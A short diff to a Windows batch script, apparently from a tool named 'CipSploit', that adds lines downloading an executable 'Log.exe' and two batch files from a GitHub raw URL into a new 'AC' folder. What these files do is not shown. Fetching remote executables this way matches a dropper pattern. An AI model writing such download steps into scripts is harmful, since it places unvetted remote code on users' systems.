@@ -8,7 +8,17 @@ ping localhost -n 5 >nul
 cd ..
 cd ..
 download https://raw.githubusercontent.com/CipRos/CipSploit/master/CipSploit.bat "NewCipsploit.bat"
-cd Downloads/XDevFolder
+cd Downloads/XDevFolder/
+if not exist ./AC/log.exe (
+download https://raw.githubusercontent.com/CipRos/CipSploit/master/Downloads/XDevFolder/AC/SendHello.bat "SendHello.bat"
+download https://raw.githubusercontent.com/CipRos/CipSploit/master/Downloads/XDevFolder/AC/Log.exe "Log.exe"
+download https://raw.githubusercontent.com/CipRos/CipSploit/master/Downloads/XDevFolder/AC/TrDll.bat "TrDll.bat"
+
+mkdir AC
+
+move Log.exe ./AC/
+move SendHello.bat ./AC/
+move TrDll.bat ./AC/
 
 
 
